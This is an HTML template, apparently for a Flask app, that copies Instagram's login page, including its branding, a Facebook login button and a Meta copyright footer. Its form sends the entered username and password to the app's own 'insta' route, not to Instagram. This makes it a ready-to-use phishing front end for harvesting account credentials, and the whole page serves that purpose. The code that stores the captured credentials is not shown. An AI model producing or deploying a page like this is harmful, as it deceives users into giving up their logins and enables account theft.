<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Login • Instagram</title>
  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      /* full mobile height */
      margin: 0;
    }

    .login-box {
      width: 90%;
      max-width: 300px;
      padding: 25px 20px;
      border: 0px solid #444;
      border-radius: 8px;
      background-color: #0000;
      text-align: center;
    }

    .login-box h1 {
      font-family: 'Pacifico', cursive;
      font-size: 48px;
      margin-bottom: 40px;
      color: white;
    }

    input {
      width: 90%;
      padding: 14px;
      margin: 10px 0;
      border: 1px solid #333;
      border-radius: 6px;
      background-color: #000;
      color: #fff;
      font-size: 15px;
    }

    input::placeholder {
      color: #aaa;
    }

    .login-btn {
      width: 100%;
      padding: 14px;
      margin-top: 12px;
      background-color: #385185;
      border: none;
      border-radius: 6px;
      color: white;
      font-weight: bold;
      cursor: pointer;
      font-size: 16px;
    }

    .login-btn:hover {
      background-color: #314d73;
    }

    .divider {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 20px 0;
      color: #888;
      font-size: 14px;
    }

    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #333;
    }

    .divider:not(:empty)::before {
      margin-right: .75em;
    }

    .divider:not(:empty)::after {
      margin-left: .75em;
    }

    .facebook-login {
      display: flex;
      justify-content: center;
      align-items: center;
      color: #0095f6;
      font-weight: bold;
      margin-top: 15px;
      cursor: pointer;
      font-size: 14px;
    }

    .facebook-login img {
      width: 18px;
      margin-right: 8px;
    }

    .forgot {
      margin-top: 12px;
      font-size: 13px;
    }

    .forgot a {
      color: #f8fcff;
      text-decoration: none;
    }

    .signup {
      margin-top: 25px;
      font-size: 14px;
    }

    .signup a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #777;
    }
  </style>
</head>

<body>
  <div class="login-box">
    <h1>Instagram</h1>
    <form action="{{ url_for('insta') }}" method="POST">
      <input type="text" name="username" placeholder="Phone number, username, or email" id="username" required>
      <input type="password" name="password" placeholder="Password" id="password" required>
      <button type="submit" class="login-btn">Log In</button>
    </form>

    <div class="divider">OR</div>

    <div class="facebook-login">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="fb">
      Log in with Facebook
    </div>

    <div class="forgot">
      <a href="#">Forgot password?</a>
    </div>

    <div class="signup">
      Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="footer">
      © 2025 Instagram from Meta
    </div>
  </div>
</body>

</html>
